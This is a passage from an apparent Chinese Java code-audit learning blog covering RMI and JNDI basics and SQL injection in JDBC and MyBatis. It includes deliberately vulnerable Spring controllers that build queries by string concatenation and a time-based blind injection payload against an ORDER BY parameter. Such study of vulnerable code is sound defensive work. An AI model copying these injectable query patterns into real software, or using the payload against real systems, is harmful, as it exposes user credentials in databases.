<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SayHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayhello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getname</span><span class="params">()</span> <span class="keyword">throws</span>  RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>实现远程接口及远程方法（继承UnicastRemoteObject）(SayHelloImpl.java)</p>
<p>必须继承UnicastRemoteObject 类，表明其可以作为远程对象，并可以被注册到注册中心，最终可以让客户端远程调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SayHelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">SayHello</span></span>&#123;</span><br><span class="line">    String name=<span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SayHelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayhello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello,I am &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getname</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;U are nothing&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>启动RMI注册服务，并注册远程对象（RmiServer.java）</p>
<p>这个步骤我们是编写RMI服务端代码，需要将上面编写的远程方法注册到注册中心去。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmiserver;</span><br><span class="line"><span class="keyword">import</span> method.SayHello;</span><br><span class="line"><span class="keyword">import</span> method.SayHelloImpl;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程方法创建等待调用ing......&quot;</span>);</span><br><span class="line"><span class="comment">//创建远程对象</span></span><br><span class="line">        SayHello sayhello = <span class="keyword">new</span> SayHelloImpl();</span><br><span class="line"><span class="comment">//创建注册表</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//将远程对象注册到注册表里面，并且取名为sayhello</span></span><br><span class="line">        registry.rebind(<span class="string">&quot;sayhello&quot;</span>, sayhello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>客户端查找远程对象，并调用远程方法（RmiClient.java）</p>
<p>这个步骤我们是编写RMI客户端代码，主要是获取到注册中心代理，查询具体注册的远程方法并调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmiclient;</span><br><span class="line"><span class="keyword">import</span> method.SayHello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry; </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException,</span></span><br><span class="line"><span class="function">            NotBoundException </span>&#123;</span><br><span class="line"><span class="comment">//获取到注册中心的代理</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//利用注册中心的代理去查询远程注册表中名为sayhello的对象</span></span><br><span class="line">        SayHello sayhello = (SayHello) registry.lookup(<span class="string">&quot;sayhello&quot;</span>);</span><br><span class="line"><span class="comment">//调用远程方法</span></span><br><span class="line">        System.out.println(sayhello.sayhello(<span class="string">&quot;POWER7089&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>执行程序：启动服务端RmiServer；运行客户端RmiClient进行调用我们对上面流程进行拆解，编写对应的代码。</p>
</li>
</ol>
<p>(大概流程清楚了，但是细节还是很模糊)</p>
<h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。<br>JNDI可以访问的目录及服务，比如：DNS、LDAP、CORBA对象服务、RMI等等。</p>
<p>简单理解：在前面一节我们学到了RMI，比如RMI对外提供了服务，那么JNDI可以通过相关API可以链接处理这些服务</p>
<p>在JNDI中提供了五个作用不同的包。</p>
<ul>
<li>javax.naming</li>
<li>javax.naming.directory</li>
<li>javax.naming.ldap</li>
<li>javax.naming.event</li>
<li>javax.naming.spi</li>
</ul>
<p>官方文档地址：<a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/jndi/overview/">https://docs.oracle.com/javase/tutorial/jndi/overview/<i class="fas fa-external-link-alt"></i></a></p>
<p>JndiServer</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> method.SayHelloImpl;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/sayhello&quot;</span>,<span class="keyword">new</span> SayHelloImpl());</span><br><span class="line">        System.out.println(<span class="string">&quot;启动成功...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>JndiClient</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> method.SayHello;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        SayHello sayHello = (SayHello)initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/sayhello&quot;</span>);	</span><br><span class="line">        System.out.println(sayHello.getname());</span><br><span class="line">        System.out.println(sayHello.sayhello(<span class="string">&quot;POWER7089&quot;</span>));</span><br><span class="line">        System.out.println(sayHello.getname());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20230817090644413.png" alt="image-20230817090644413"></p>
<h1 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h1><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>java.sql.Statement没啥好说的，</p>
<p>主要看一下预编译java.sql.PreparedStatement和order by</p>
<h3 id="java-sql-PreparedStatement"><a href="#java-sql-PreparedStatement" class="headerlink" title="java.sql.PreparedStatement"></a>java.sql.PreparedStatement</h3><p>预编译java.sql.PreparedStatement示例代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.sqlidemo.jdbcinjection;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> * 错误的预编译</span></span><br><span class="line"><span class="comment"> * http://localhost:7089/sqli/jdbc/preparestaement?username=admin</span></span><br><span class="line"><span class="comment"> * 安全代码</span></span><br><span class="line"><span class="comment"> * http://localhost:7089/sqli/jdbc/sec?username=admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/sqli&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcPrepareStatement</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jdbc/sec&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">jdbcsec</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">            SQLException, ClassNotFoundException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection conn = DriverManager.getConnection(url, user, password);</span><br><span class="line"><span class="comment">// 安全代码</span></span><br><span class="line">        String sql = <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line">        PreparedStatement preparestatement = conn.prepareStatement(sql);</span><br><span class="line">        preparestatement.setString(<span class="number">1</span>, username);</span><br><span class="line">        ResultSet rs = preparestatement.executeQuery();</span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            String resUsername = rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            String resPassword = rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            String info = String.format(<span class="string">&quot;%s: %s\n&quot;</span>, resUsername, resPassword);</span><br><span class="line">            result.append(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        conn.close();</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jdbc/preparestaement&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">jdbcPrepare</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">            ClassNotFoundException, SQLException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection conn = DriverManager.getConnection(url, user, password);</span><br><span class="line"><span class="comment">//没有正确使用预编译方式，SQL语句还是进行了动态拼接</span></span><br><span class="line">        String sql = <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        PreparedStatement preparestatement = conn.prepareStatement(sql);</span><br><span class="line">        ResultSet rs = preparestatement.executeQuery();</span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            String reUsername = rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            String resPassword = rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            String info = String.format(<span class="string">&quot;%s: %s\n&quot;</span>, reUsername, resPassword);</span><br><span class="line">            result.append(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        conn.close();</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二个jdbcPrepare中，虽然是用的预编译执行sql语句，但是还是增加了拼接的部分，把username未经过滤就拼接到了sql语句中去了。</p>
<h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>在SQL语句中， order by 语句用于对结果集进行排序。 order by 语句后面需要是字段名或者字段位置。<br>在使用 PreparedStatement 预编译时，会将传递任意参数使用单引号包裹进而变为了字符串。<br>如果使用预编译方式执行 order by 语句，设置的字段名会被人为是字符串，而不在是字段名。<br>因此，在使用 order by 时，就不能使用 PreparedStatement 预编译了。</p>
<p>order by示例代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.sqlidemo.jdbcinjection;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> * order by 注入</span></span><br><span class="line"><span class="comment"> * http://localhost:7089/sqli/jdbc/orderby?id=1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/sqli&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcOrderBy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jdbc/orderby&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">jdbcOrderby</span><span class="params">(<span class="meta">@RequestParam(&quot;id&quot;)</span> String id)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">            ClassNotFoundException, SQLException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection conn = DriverManager.getConnection(url, user, password);</span><br><span class="line">        String sql = <span class="string">&quot;select * from users&quot;</span> + <span class="string">&quot; order by &quot;</span> + id;</span><br><span class="line">        PreparedStatement preparestatement = conn.prepareStatement(sql);</span><br><span class="line">        ResultSet rs = preparestatement.executeQuery();</span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            String reUsername = rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            String resPassword = rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            String info = String.format(<span class="string">&quot;%s: %s\n&quot;</span>, reUsername, resPassword);</span><br><span class="line">            result.append(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        conn.close();</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((6&#x3D;(select length(version()))),sleep(0.5),sleep(1.2))--+</span><br></pre></td></tr></table></figure>

<p>感觉有点复杂了，<del>学艺不精</del>    </p>
<p><img src="image-20230817130658383.png" alt="image-20230817130658383"></p>
<p><img src="image-20230817130718414.png" alt="image-20230817130718414"></p>
<h2 id="mybatis"><a href="#mybatis" class="headerlink" title="mybatis"></a>mybatis</h2><h3 id="Mybatis中-和-区别"><a href="#Mybatis中-和-区别" class="headerlink" title="Mybatis中#{}和${}区别"></a>Mybatis中#{}和${}区别</h3><p>在Mybatis中拼接SQL语句有两种方式：一种是占位符 #{} ，另一种是拼接符 ${} 。</p>
<ul>
<li><p>占位符 #{} ：对传入的参数进行预编译转义处理。类似JDBC中的 PreparedStatement 。比如： select * from user where id = #{number} ，如果传入数值为1，最终会被解析成 select * from user where id = “1” 。</p>
</li>
<li><p>拼接符 ${} ：对传入的参数不做处理，直接拼接，进而会造成SQL注入漏洞。比如：比如： select * from user where id = ${number} ，如果传入数值为1，最终会被解析成select * from user where id = 1 。</p>
</li>
</ul>
<p>#{} 可以有效防止SQL注入漏洞。 ${} 则无法防止SQL注入漏洞。<br>因此在我们对JavaWeb整合Mybatis系统进行代码审计时，应着重审计SQL语句拼接的地方。<br>除非开发人员的粗心对拼接语句使用了 ${} 方式造成的SQL注入漏洞。<br>在Mybatis中有几种场景是不能使用预编译方式的，比如： <strong>order by、in、like</strong> 。</p>
<p>示例代码</p>
<p>MybaitsController.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.sqlidemo.mybatisinjection;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/sqli&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MybaitsController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line">    <span class="comment">//orderby查询 http://localhost:7089/sqli/mybatis/orderby?sort=username</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/mybatis/orderby&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">orderbySql</span><span class="params">(<span class="meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.orderbyInjection(sort);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//in查询 http://localhost:7089/sqli/mybatis/in?params=1</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/mybatis/in&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">inSql</span><span class="params">(<span class="meta">@RequestParam(&quot;params&quot;)</span> String params)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.inInjection(params);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Like查询 http://localhost:7089/sqli/mybatis/like?username=admin</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/mybatis/like&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">likeSql</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.likeInjection(username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.sqlidemo.mybatisinjection;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String name)</span> 